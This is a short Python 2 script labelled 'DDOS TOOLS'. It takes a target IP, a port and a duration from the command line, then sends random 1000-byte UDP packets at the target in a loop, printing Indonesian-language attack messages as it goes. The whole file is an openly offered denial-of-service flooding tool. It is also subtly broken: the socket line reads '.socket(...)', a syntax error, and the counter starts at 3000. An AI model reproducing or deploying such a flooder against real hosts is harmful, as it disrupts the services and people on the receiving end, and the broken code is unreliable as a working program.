
import time
import socket
import random
import sys

def usage():
    print("DDOS TOOLS")
    
def flood(victim, vport, duration):
    #DDOS TOOLS
    client = .socket(socket.AF_INET, socket.SOCK_DGRAM)
    #ini byte
    bytes = random._urandom(1000)
    timeout = time.time() + duration
    sent = 3000
    
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Attack %s memberi kopi %s di port %s "%(sent, victim, vport)
        
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
        
if __name__ == '__main__':
    main()